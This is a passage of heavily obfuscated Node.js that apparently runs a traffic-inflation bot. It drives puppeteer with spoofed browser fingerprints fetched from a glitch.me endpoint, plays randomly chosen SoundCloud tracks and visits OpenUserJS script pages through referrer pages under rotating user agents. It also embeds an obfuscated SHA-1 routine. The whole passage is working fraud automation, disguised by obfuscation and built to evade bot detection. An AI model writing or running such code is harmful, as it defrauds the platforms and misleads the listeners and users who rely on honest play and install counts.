      'https://so' + 'undcloud.c' + 'om/sadfros' + 'ty/beavis-' + 'butthead?s' + 'i=289d5c98' + 'ab0142b982' + '8ef6d51245' + 'b690&utm_s' + 'ource=clip' + 'board&utm_' + 'medium=tex' + 't&utm_camp' + 'aign=socia' + 'l_sharing',
      'https://so' + 'undcloud.c' + 'om/tyler-w' + 'allace-62/' + 'legacy-emi' + 'nem-remix-' + '1?si=8789c' + '4ffc202403' + 'bb58d7a49a' + '59ee589&ut' + a0(0x1) + 'lipboard&u' + 'tm_medium=' + 'text&utm_c' + 'ampaign=so' + 'cial_shari' + 'ng'
    ],
    'oujsToAssist': [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    'oujsUAs': [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + Z(0x8, 'Z[39') + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + Z(0x13, 'Wtl8') + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ]
  },
  HookManager = {
    'prototypes': () => {
      Array['prototype']['repeatExte' + 'nd'] = function(g) {
        let h = this,
          i = h;
        for (let j = -0x20b6 + -0x169 * 0x19 + 0x1 * 0x43f7; j < g; j++)
          i = i['concat'](h);
        return i;
      }, Array['prototype']['random'] = function() {
        return this[floor(random() * this['length'])];
      };
      const f = new Map();
      Array['prototype']['randomFlus' + 'h'] = function(g) {
        let h = this[floor(random() * this['length'])];
        f['has'](g) || f['set'](g, new Set());
        const i = f['get'](g);
        for (; i['has'](h);)
          i['size'] === this['length'] && i['clear'](), h = this[floor(random() * this['length'])];
        return i['add'](h), h;
      };
    }
  };

function a() {
  const aV = [
    'zs95B3v0DwjLlG',
    'm_source=c',
    'ChrZl2j5lxnPDa',
    'meType',
    '=text&utm_',
    'vCkAc8oY',
    'nCofW4RcKSkMW5qia8knta',
    'Kit/537.36',
    'BCo3WQTlWO8HcmozW5K3',
    'B8oiumkstSojWRldQG',
    'Ahr0Chm6lY9NCG',
    'W75PWP7dMa',
    'e/youtube.',
    'javascript',
    '-auto-heal',
    'W5TUWOqMhSkkWQFdU8kviq',
    'research',
    'WOdcNCo9WQ/cLCoDWRhcTCkMDq',
    'z2v0rwXLBwvUDa',
    'WOqDW70wW6bMW7zkW44U',
    'WO/dLSkhvCo+W4RcJSo3WPNcVa',
    'DXRcH8kFF1pdJmkJxCk0'
  ];
  a = function() {
    return aV;
  };
  return a();
}
HookManager['prototypes']();

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (-0x1bfa + -0x48 * 0xd + 0x1fa2);
    let h = e[f];
    return h;
  }, d(b, c);
}

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (-0x1bfa + -0x48 * 0xd + 0x1fa2);
    let h = e[f];
    if (c['pTpPms'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = 0x93e + -0x1b07 + 0x1d * 0x9d, r, s, t = 0x9 * -0x15b + -0x283 * 0xc + 0x1 * 0x2a57; s = m['charAt'](t++); ~s && (r = q % (-0xd0e + -0xd9b + 0x1aad) ? r * (0x215f * -0x1 + -0x3b * -0xa7 + -0x4de) + s : s, q++ % (0x1a61 + 0x28b + -0xe74 * 0x2)) ? o += String['fromCharCode'](-0x21ca + 0x57 * 0x71 + -0x39e & r >> (-(-0x26bd + 0x1 * 0x1717 + 0xfa8) * q & -0x41 * -0x95 + 0x2096 + -0x4665)) : 0x14 * 0x71 + -0x2218 + 0x1944) {
          s = n['indexOf'](s);
        }
        for (let u = 0x230e + 0x1893 + 0xd7 * -0x47, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](0x12b7 + -0x1 * 0x85f + -0xa48))['slice'](-(0xf * -0x22 + -0x12 * 0x209 + 0x26a2));
        }
        return decodeURIComponent(p);
      };
      c['qrbcdm'] = i, b = arguments, c['pTpPms'] = !![];
    }
    const j = e[-0x20b6 + -0x169 * 0x19 + 0x1 * 0x43f7],
      k = f + j,
      l = b[k];
    return !l ? (h = c['qrbcdm'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}
const actions = [
  [
    () => flags['ActivateBr' + 'owser'],
    async () => {
      async function f(o = '', p = 0x6 * 0x5ed + 0x2 * 0x114e + -0x4629, q) {
        const u = await q['waitForSel' + 'ector'](o);
        return await m['simClickEl' + 'ement'](u, {
          'pauseAfterMouseUp': p
        }), u;
      }
      log('index.js\x20c' + 'alled');
      const {
        FakeBrowser: g
      } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new g['Builder']()['displayUse' + 'rActionLay' + 'er'](0xad * -0x5 + 0x4e6 * -0x5 + 0x1be * 0x10)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
        'blockTrackers': 0x1,
        'blockTrackersAndAnnoyances': 0x1
      })])['userDataDi' + 'r'](i);
      let k;
      r:
        for (;;)
          try {
            let o = await async function p() {
              let q;
              const r = {
                'User-Agent': q['userAgents']['random'](),
                'Accept-Encoding': 'none'
              };
              try {
                q = (await axios['get']('https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc', {
                  'headers': r
                }))?.['data'];
              } catch (u) {}
              if (q)
                try {
                  q = (await axios['get'](q, {
                    'headers': r
                  }))?.['data'];
                } catch (v) {}
              if (!q)
                return await randomWait(), await p();
              try {
                return 'object' == typeof q ? q : 'string' == typeof q ? JSON['parse'](q) : {};
              } catch (w) {
                if (!q)
                  return await randomWait(), await p();
              }
            }();
            flags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](o), k = await j['launch']();
            break r;
          } catch (q) {
            warn(q), await randomWait();
          }
      const {
        vanillaBrowser: l,
        userAction: m
      } = k, n = await l['createInco' + 'gnitoBrows' + 'erContext']();
      log('browser\x20la' + 'unched'), flags['RPL2_GF'] && setTimeout(async () => {
        async function r() {
          const a2 = b,
            s = await l['createInco' + 'gnitoBrows' + 'erContext']();
          if (flags['RPL2_SC2'] && Math['random']() >= -0x22cf + 0x575 * 0x7 + -0x7 * 0x7c + 0.3) {
            const u = await s['newPage']();
            let v = 0x8 * -0x2e6 + -0x189 * -0xd + 0x33b;
            if (await u['goto'](data['soundcloud' + 'Tracks']['random'](), {
                'timeout': NETWORK_PATIENCE
              })['catch'](w => v++), v)
              return await u['close'](), await s['close'](), createPage();
            try {
              await u['evaluate'](() => {
                let x = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
                x && 'Play' === x['textConten' + 't'] && (x['id'] = '______hook' + '5');
              });
              let w = await u['$']('#______hoo' + 'k5');
              w && await f('#______hoo' + 'k5', -0x43 * 0x3d + 0x8fa + 0x166 * 0x5, u), await wait(-0xe682 + 0x1 * 0x2ac1 + 0x16b89 + getRandomInt(0x2 * 0x3401 + -0x278d + 0x13 * -0x4f, -0x5db * -0x1 + 0x5 * -0x4cd + -0x1 * -0x8756));
            } catch (x) {}
            return await u['close'](), await s['close'](), createPage();
          } {
            const {
              url: y,
              preRef: z
            } = data['scriptTarg' + 'ets']['randomFlus' + 'h'](0x28 * -0xcb + 0x286 + 0x1d33), A = await l['createInco' + 'gnitoBrows' + 'erContext'](), B = await A['newPage']();
            let C = -0x11cb + -0x7f7 + 0x1d7 * 0xe;
            if (await B['goto'](z, {
                'timeout': NETWORK_PATIENCE
              })['catch'](E => C++), C)
              return await B['close'](), await A['close'](), r();
            const D = await B[a2(0x9, 've2d')]('!document.' + 'documentEl' + 'ement.inne' + 'rHTML.incl' + 'udes(\x22scri' + 'pt-descrip' + 'tion\x22);');
            return D ? (await B['close'](), await A['close'](), r()) : (await B['goto'](y, {
              'timeout': NETWORK_PATIENCE
            })['catch'](E => C++), C ? (await B['close'](), await A['close'](), r()) : (await new Promise(E => setTimeout(E, -0x1415 * 0x1 + -0x3d * 0x5 + -0x49 * -0x66 + floor((0x29a * -0xb + 0x21be + -0x138 * 0x1) * random()))), await B['evaluate'](() => {
              const a3 = c;
              var E, F, G, H, I, J, K, L, M = 'object' == typeof window ? window : {},
                N = !M['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
              N && (M = global), E = ('0123456789' + 'abcdef')['split'](''), F = [
                -(0x10a14e16 + -0xbb4aad2e + 0x12aa95f18),
                0x6346 * 0x12f + -0xcf54db + 0x7f07 * 0x1b7,
                -0xf661 + -0xd419 * -0x1 + 0xa248,
                -0xa6c + -0x294 * -0x3 + 0x33 * 0x10
              ], G = [
                0x138a + 0x1 * -0x13d5 + 0x1 * 0x63,
                0x12ed + -0x124e * 0x1 + -0x8f,
                -0x15b * -0x7 + 0x17 * -0x14f + 0x14a4,
                -0x2482 + 0x2389 + 0xf9
              ], H = [
                'hex',
                'array',
                'digest',
                'arrayBuffe' + 'r'
              ], I = [], J = function(R) {
                return function(S) {
                  return new O(-0x2 * -0x303 + 0x1f16 + 0x19d * -0x17)['update'](S)[R]();
                };
              }, K = function() {
                var R, S, T = J('hex');
                for (N && (T = L(T)), T['create'] = function() {
                    return new O();
                  }, T['update'] = function(U) {
                    return T['create']()['update'](U);
                  }, R = 0xf23 + 0xb58 + -0x1a7b; R < H['length']; ++R)
                  S = H[R], T[S] = J(S);
                return T;
              }, L = function(R) {
                var S = eval('require(\'crypto\');'),
                  T = eval('require(\'buffer\')[\'Buffer\'];'),
                  U = function(V) {
                    if ('string' == typeof V)
                      return S['createHash']('sha1')['update'](V, 'utf8')['digest']('hex');
                    if (V['constructo' + 'r'] === ArrayBuffer)
                      V = new Uint8Array(V);
                    else {
                      if (void(0x1948 + -0x20c4 + 0x77c) === V['length'])
                        return R(V);
                    }
                    return S['createHash']('sha1')['update'](new T(V))['digest']('hex');
                  };
                return U;
              };
              class O {
                constructor(R) {
                    R ? (I[-0x258d + 0x1d79 + 0x814] = I[-0x26cf + 0x1920 + -0x187 * -0x9] = I[0xb63 * -0x2 + 0x2 * 0x745 + 0x83d] = I[0x2 * 0xd5d + 0x8 * -0x2db + -0x3e0] = I[-0x118b * 0x1 + 0x4cf * 0x8 + -0x1 * 0x14ea] = I[0xf00 + -0x1ce2 + 0xde6 * 0x1] = I[-0x4d * -0x71 + 0x16a9 + 0x85 * -0x6d] = I[0x19 * 0x149 + 0x13de + -0x377 * 0xf] = I[0x1 * -0x1f3b + -0x2325 + -0xbf * -0x59] = I[0xe41 * 0x1 + -0x24dd + 0x16a4] = I[-0xb45 + -0x1 * -0x68a + 0x14 * 0x3d] = I[-0x1f93 + -0x805 + 0x27a2] = I[-0x936 + 0xfb * 0x13 + -0x960] = I[0x53 * 0x5c + 0x92 * -0x3d + 0x502] = I[0xaee + 0x3 * -0xaf4 + -0x14b * -0x11] = I[0x2434 + -0x76e + -0x1cb8] = I[0x11a4 + -0x77 + -0x111e] = -0x5 * 0xeb + 0x6 * -0x347 + 0x1841 * 0x1, this['blocks'] = I) : this['blocks'] = [
                      0x2698 + -0xb * 0x7e + 0x2 * -0x1097,
                      -0x1e4 * 0x1 + 0x2666 + -0x2 * 0x1241,
                      0x255e * -0x1 + -0x1b * -0xc + 0x241a,
                      -0x98a + 0x1114 + 0x182 * -0x5,
                      0x159 * 0x1a + -0x3 * -0x14e + -0x26f4,
                      -0xf93 + -0x13 * -0x153 + 0x3 * -0x332,
                      -0x39f + -0x139 * 0x1 + -0x7c * -0xa,
                      0x1968 + -0x2 * -0x1369 + -0x2 * 0x201d,
                      0x14a1 + 0x3 * -0x43c + -0x7ed,
                      0xa04 + 0x21b * 0x1 + -0xc1f,
                      -0x14fb + -0x15c0 + 0x2abb,
                      -0x1923 + 0xb6c + 0xdb7,
                      -0x1cac * 0x1 + 0x777 + 0x59 * 0x3d,
                      0x16e9 + 0x24bb + 0x2 * -0x1dd2,
                      0x7f * -0x17 + -0x5f3 + 0x4 * 0x457,
                      -0x626 + 0x2 * 0x1105 + 0x1e * -0xee,
                      0x1fc * -0xc + 0x264b * -0x1 + -0x3e1b * -0x1
                    ], this['h0'] = 0x4b1ddfcb + -0x6b6e35bb + 0x879578f1, this['h1'] = 0x14eb15e67 * 0x1 + 0x8ec9067 * -0x25 + 0xeb4d2c05, this['h2'] = 0xeca11ee9 + -0x5 * -0x3a7716d0 + 0x1 * -0x17839b3fb, this['h3'] = -0x109f4830 + -0x1ec9ed93 * -0x1 + -0x29 * -0xcacdb, this['h4'] = 0x12f8f614b + 0x1319a3905 + -0x19d56b860, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = -0x2 * -0x702 + -0x1738 * 0x1 + 0x934, this['finalized'] = this['hashed'] = -0x26b6 + 0x12d1 * -0x1 + 0x132d * 0x3, this['first'] = 0x1 * -0xa7 + -0x171a + 0x17c2;
                  }
                  ['update'](R) {
                    var S, T, U, V, W, X;
                    if (!this['finalized']) {
                      for ((S = 'string' != typeof R) && R['constructo' + 'r'] === M['ArrayBuffe' + 'r'] && (R = new Uint8Array(R)), U = 0x61b * 0x1 + 0xc * 0x11b + -0x135f, W = R['length'] || -0x1 * -0x491 + 0x15c7 * -0x1 + 0x1136, X = this['blocks']; U < W;) {
                        if (this['hashed'] && (this['hashed'] = -0x11 * 0xfa + 0x3e8 + -0xa * -0x145, X[-0x85b * 0x4 + 0xf59 + 0x295 * 0x7] = this['block'], X[0x19e6 + -0x66e * 0x5 + 0x650] = X[-0x108f * 0x2 + 0x3 * -0x3d5 + 0x164f * 0x2] = X[-0x2 * 0xe69 + -0x451 * 0x5 + 0x3269] = X[-0x19ae + -0x1 * -0x1 + -0x18 * -0x112] = X[-0x1b55 + -0xb * -0x377 + 0x6a * -0x1a] = X[0x19dd * 0x1 + -0x19c1 + 0x1 * -0x17] = X[0x1d3b + -0x4ee + 0x1847 * -0x1] = X[-0x891 * -0x1 + 0x1eee + -0x2778] = X[0xe23 + -0x22c7 + 0x14ac] = X[-0x9f7 + -0xd * -0x2e8 + -0x1c * 0xfe] = X[-0x1 * -0xd + 0x994 * -0x1 + 0x991] = X[0x960 + -0x2169 + 0x1814] = X[-0x12d4 + -0x10eb + -0x31 * -0xbb] = X[0x1f67 + -0xc83 * 0x2 + -0x32a * 0x2] = X[-0xae5 * 0x2 + -0x18cc + 0x4 * 0xba9] = X[-0x1 * -0x1e01 + 0x959 * 0x3 + -0x39fd] = 0x332 * -0x9 + 0x315 * -0x3 + 0x2601), S) {
                          for (V = this['start']; U < W && V < 0x85d + 0x577 * 0x3 + -0xc41 * 0x2; ++U)
                            X[V >> 0x449 * -0x2 + -0x106 * 0x11 + 0x19fa] |= R[U] << G[0xcee + 0x1ca * -0x8 + -0x7 * -0x33 & V++];
                        } else {
                          for (V = this['start']; U < W && V < -0x1a5d + 0x397 * -0x3 + 0x77a * 0x5; ++U)
                            (T = R['charCodeAt'](U)) < 0x50f * -0x5 + -0xd42 + 0x270d ? X[V >> 0x9e1 + 0x1117 + -0x1ed * 0xe] |= T << G[-0x18ad * -0x1 + -0xfe7 + -0x1 * 0x8c3 & V++] : T < 0x16d5 + -0x130 + -0x1f3 * 0x7 ? (X[V >> -0x897 * 0x1 + 0xbc8 + -0x32f] |= (-0x1ff5 + 0x1 * -0x2089 + 0x413e | T >> -0x2e0 + 0xc61 + 0x329 * -0x3) << G[-0x240 + -0x84 * -0x16 + 0x1 * -0x915 & V++], X[V >> -0x2 * -0xc61 + -0x1582 + -0x5 * 0xa6] |= (-0x15b6 + -0xac4 + 0x15 * 0x192 | 0x131e + -0x23dd + 0x122 * 0xf & T) << G[-0x2a * -0xe9 + 0x1 * -0xe3e + -0x1 * 0x17f9 & V++]) : T < -0x161a0 + -0x9610 + 0x2cfb0 || T >= 0x8b * 0x2de + -0x18ff3 + 0xe169 ? (X[V >> -0x2 * -0x866 + 0x127a + -0x2344] |= (0x1652 + -0x2 * -0x50e + -0x2 * 0xfc7 | T >> 0x1 * 0xed5 + 0x4f3 + 0x6 * -0x34a) << G[-0xd19 + 0x10e4 + -0x3c8 & V++], X[V >> 0x863 + -0x7fd * 0x2 + 0x799 * 0x1] |= (0x2455 + 0x757 * 0x1 + -0x2b2c | T >> 0x6a * -0x5b + 0x8 * 0x3f1 + 0x4 * 0x18b & -0x23a6 + 0x3f9 + -0xaa4 * -0x3) << G[0x29c * 0x8 + 0x15a + -0x1637 & V++], X[V >> -0x1ade + -0x1 * -0x196a + -0x1 * -0x176] |= (-0x6f * 0xf + 0x6 * 0x643 + -0x1e91 | 0x1eef * 0x1 + 0xd49 + -0x2bf9 & T) << G[0x1c24 + 0x2421 + 0x32 * -0x149 & V++]) : (T = -0x1 * 0xe42b + -0x35 * 0x17b + 0xb * 0x3326 + ((0xd8b * -0x2 + -0x1ca * 0x3 + 0x1f * 0x12d & T) << 0x1a3 + -0x9f6 + 0x1 * 0x85d | -0x14 * -0x199 + -0xa75 + -0xe0 * 0x14 & R['charCodeAt'](++U)), X[V >> 0x1202 + 0x1 * 0x2027 + -0x1 * 0x3227] |= (0xfbb * -0x1 + -0x1d6 * -0x5 + 0x1 * 0x77d | T >> 0x1 * 0x1a9c + 0x99 * -0x2 + -0x1958) << G[0x17ac + 0x316 + 0xa7 * -0x29 & V++], X[V >> 0x51 * -0x65 + -0x515 + 0x2 * 0x1286] |= (-0x28b + -0x1982 + 0x1c8d | T >> 0x25cd + 0x2 * -0x18e + -0x31 * 0xb5 & 0xc86 + -0x1973 * -0x1 + -0x25ba) << G[-0xf95 * 0x1 + 0x20f * -0xb + 0x263d & V++], X[V >> -0x1c8f * 0x1 + -0xd98 * -0x2 + 0x161 * 0x1] |= (-0x91f * 0x2 + 0x13bf + 0x1 * -0x101 | T >> 0xd9 * 0x28 + -0x4 * -0x256 + -0x2b3a & 0x140e + -0xa23 * 0x2 + 0x77 * 0x1) << G[0x195e + -0x19c * 0x18 + 0xd45 & V++], X[V >> 0x130c * 0x1 + 0x106b + -0x2375] |= (0x14fb * -0x1 + 0xb3b + 0x2 * 0x520 | 0x2b * 0x29 + -0x1731 + 0x1 * 0x108d & T) << G[-0x43 * -0x3 + -0x9 * 0x3b7 + 0x20a9 & V++]);
                        }
                        this['lastByteIn' + 'dex'] = V, this['bytes'] += V - this['start'], V >= 0x1a9 * 0xd + -0x1 * -0x4bb + -0x1a10 ? (this['block'] = X[0x197 + 0x9fd * -0x1 + 0x3 * 0x2d2], this['start'] = V - (0x503 + -0x8b * 0x11 + 0x478), this['hash'](), this['hashed'] = 0x3a5 * 0x7 + -0x3bc * 0x8 + 0x45e) : this['start'] = V;
                      }
                      return this['bytes'] > 0xa5809bf * -0x11 + 0x13118508f + -0x17d76f * -0x551 && (this['hBytes'] += this['bytes'] / (0x2e2195 * 0xdc + -0x122c * 0x15ca3f + 0x2645254c8) << -0x25d9 * -0x1 + -0x17ae + 0x117 * -0xd, this['bytes'] = this['bytes'] % (-0x1d2ced438 + 0x4 * -0x7578629 + -0x13 * -0x27969334)), this;
                    }
                  }
                  ['finalize']() {
                    if (!this['finalized']) {
                      this['finalized'] = -0x1b5f + -0x23db + 0x3f3b * 0x1;
                      var R = this['blocks'],
                        S = this['lastByteIn' + 'dex'];
                      R[0x7f1 + -0x5 * -0x5fb + -0x25c8] = this['block'], R[S >> -0x9f3 + -0x9 * -0x52 + 0x713] |= F[-0x17ad + 0x92 * 0x32 + -0x4d4 & S], this['block'] = R[0x625 + 0x3 * -0xb11 + 0x1b1e], S >= -0x1683 + -0x1d25 + -0x10 * -0x33e && (this['hashed'] || this['hash'](), R[-0x1041 + -0x1 * 0xdee + -0x1e2f * -0x1] = this['block'], R[-0x1669 + -0x19 * 0x166 + -0xd * -0x46b] = R[0x444 * -0x3 + 0x221 * 0x2 + 0x88b] = R[0xf7 * 0x17 + 0x504 + -0x1b33] = R[-0x24a + 0x1d47 + -0x1afa] = R[-0x1 * -0x16b5 + -0x1cbe + -0x60d * -0x1] = R[-0x30e * 0xb + -0x240d + 0x45ac] = R[-0x8c9 + -0x1dd3 * 0x1 + -0x26a2 * -0x1] = R[-0x170a + 0xa7c + 0xc95 * 0x1] = R[0x1 * 0x1f3 + 0x773 + 0x1 * -0x95e] = R[-0x2f * -0x1c + 0xa4a + -0xf65] = R[0x971 * 0x1 + 0x481 + -0xde8] = R[0x2515 + -0xe2 * -0x16 + -0x3876] = R[0xe57 * 0x1 + 0x21 * 0x25 + 0x131 * -0x10] = R[-0x1d07 * 0x1 + 0x1 * -0x1cc9 + 0x1 * 0x39dd] = R[-0xea9 + -0x1783 + 0x263a] = R[-0x6d * 0x29 + -0x21af + -0x33 * -0x101] = -0x1339 * -0x1 + -0x23f3 * 0x1 + 0x10ba), R[-0xa3 * 0x25 + -0x2062 + -0x37ff * -0x1] = this['hBytes'] << 0x715 + 0x826 + -0xf38 | this['bytes'] >>> 0x1084 + 0xab2 + -0x1b19, R[0x1f * -0x8d + -0x1a * 0x156 + 0x114a * 0x3] = this['bytes'] << -0x26ff + 0x334 * -0x4 + 0x33d2, this['hash']();
                    }
                  }
                  ['hash']() {
                    var R, S, T = this['h0'],
                      U = this['h1'],
                      V = this['h2'],
                      W = this['h3'],
                      X = this['h4'],
                      Y = this['blocks'];
                    for (R = -0x66 * 0x23 + 0x10 * 0x2c + 0xb42; R < 0x9bb * 0x2 + 0x2 * -0xaed + 0x2b4 * 0x1; ++R)
                      S = Y[R - (0x175 * 0x17 + -0x1 * -0x48d + 0xcaf * -0x3)] ^ Y[R - (0xc3a + -0x29 * -0x2b + -0x3d1 * 0x5)] ^ Y[R - (0x5 * -0xd6 + 0x1 * -0xc4 + 0x500)] ^ Y[R - (-0x1 * 0x1894 + -0x57a * -0x7 + -0xdb2)], Y[R] = S << 0x2 * -0x50 + 0x3 * -0x7f9 + -0x188c * -0x1 | S >>> -0x1a56 + 0x1724 + 0x351;
                    for (R = 0x68d * 0x2 + -0x1dc0 + 0x10a6 * 0x1; R < -0x12ac + 0x1d * 0xa9 + 0x1 * -0x65; R += -0x2309 * -0x1 + -0x4 * -0x464 + -0x4 * 0xd25)
                      T = (S = (U = (S = (V = (S = (W = (S = (X = (S = T << 0x1 * 0x2f5 + 0xb * -0x14b + 0xb49 | T >>> 0x5b * -0x2e + 0x1168 + -0xf3) + (U & V | ~U & W) + X + (-0x38cf91e5 * 0x2 + 0x445478b3 + 0x87cd24b0) + Y[R] << -0x3b5 * -0x5 + 0x1324 + -0x25ad) << -0x26a7 + -0x1347 + 0xb97 * 0x5 | X >>> 0x43 * 0x6d + 0x167b + -0x32e7) + (T & (U = U << 0x1c0f + 0x6 * 0x56f + 0xb * -0x581 | U >>> -0x1 * 0x21eb + 0x13ca + -0xe23 * -0x1) | ~T & V) + W + (-0x87062120 + -0x6b2a9c61 + -0x2 * -0xa6599b8d) + Y[R + (-0x4f * 0xd + -0x238e + 0x2792)] << 0x1a44 + -0x2b * 0x89 + 0x31 * -0x11) << 0x1 * -0xd7c + 0x2 * -0x4c3 + 0x1707 * 0x1 | W >>> 0x1cac + -0x1 * -0xaf3 + -0x696 * 0x6) + (X & (T = T << -0x192b + -0x7c6 + 0x210f | T >>> -0x95 * 0x32 + 0xa8d + 0x128f) | ~X & U) + V + (-0x3feef0da + 0xa1e5c2fa + 0x1 * -0x7745887) + Y[R + (0x117e * 0x2 + 0x16ca + -0x39c4)] << -0x1 * 0x21d9 + 0xe26 + 0x13b3) << -0x22c6 + -0x357 + 0x1311 * 0x2 | V >>> 0x10bb * 0x1 + -0xded + -0x2b3) + (W & (X = X << -0x1 * 0x159b + 0x1803 + -0x24a | X >>> -0x1 * 0x67 + -0x151f * 0x1 + 0x1588) | ~W & T) + U + (-0x1ddad2f9 + 0xfb * 0xac6c23 + -0x30b0b9bf) + Y[R + (-0x180e + -0xb5 * 0x1d + -0xe * -0x32f)] << -0x107 * -0x10 + -0x1acf + 0xa5f) << -0x767 * -0x2 + -0x2201 + 0x334 * 0x6 | U >>> -0xe * -0x47 + 0x18f * 0xd + -0x180a * 0x1) + (V & (W = W << 0xd5f + 0x142b + -0x216c | W >>> 0xe62 